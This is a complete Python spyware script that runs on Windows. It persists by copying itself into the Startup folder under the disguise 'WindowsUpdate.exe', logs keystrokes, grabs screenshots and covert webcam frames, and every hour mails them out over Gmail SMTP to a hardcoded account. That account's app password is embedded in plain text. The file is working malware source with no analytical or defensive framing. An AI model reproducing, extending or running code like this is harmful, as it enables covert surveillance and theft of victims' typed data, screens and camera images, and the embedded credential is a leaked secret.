import os, sys, shutil, smtplib, cv2
from datetime import datetime
from threading import Timer
from pynput import keyboard
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import time

# ========================
# CONFIGURATION
# ========================

EMAIL = "lliioonnsscub@gmail.com"     #  Use burner Gmail with App Password!
PASSWORD = "kcbf iwar igxy jjqj"
INTERVAL = 3600                     # Every hour
STEALTH_NAME = "WindowsUpdate.exe"

# Safe Paths
LOG_FILE = os.path.join(os.getenv("APPDATA"), "winlog.txt")
SS_FILE = os.path.join(os.getenv("APPDATA"), "screenshot.jpg")
WC_FILE = os.path.join(os.getenv("APPDATA"), "webcam.jpg")

# ========================
# HELPER FUNCTIONS
# ========================

log = ""

def get_self_path():
    return sys.executable if getattr(sys, 'frozen', False) else os.path.realpath(__file__)

def add_to_startup():
    try:
        startup = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        destination = os.path.join(startup, STEALTH_NAME)
        if not os.path.exists(destination):
            shutil.copyfile(get_self_path(), destination)
    except:
        pass

def on_press(key):
    global log
    try:
        if hasattr(key, 'char') and key.char is not None and key.char.isalpha():
            log += key.char
    except:
        pass

def write_log(data):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(data)
    except:
        pass

def capture_screenshot():
    try:
        img = ImageGrab.grab()
        img.save(SS_FILE)
    except:
        pass

def capture_webcam():
    try:
        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        time.sleep(1.5)
        for _ in range(5):
            ret, frame = cam.read()
        if ret:
            cv2.imwrite(WC_FILE, frame)
        cam.release()
        cv2.destroyAllWindows()
    except Exception as e:
        print(f"[Webcam Error] {e}")

def send_email(data, attachments=[]):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL
        msg['To'] = EMAIL
        msg['Subject'] = f"Ghost Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        msg.attach(MIMEText(data, 'plain'))

        for file in attachments:
            if os.path.exists(file):
                with open(file, 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(file)}')
                    msg.attach(part)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL, PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print(f"[Email Error] {e}")

def report():
    global log
    if log.strip():
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f"[+] Log Time: {timestamp}\n{log}"
        write_log(data)
        capture_screenshot()
        capture_webcam()
        send_email(data, [SS_FILE, WC_FILE])
        log = ""
    Timer(INTERVAL, report).start()

# ========================
# LAUNCH
# ========================

add_to_startup()
listener = keyboard.Listener(on_press=on_press)
listener.start()
report()
listener.join()
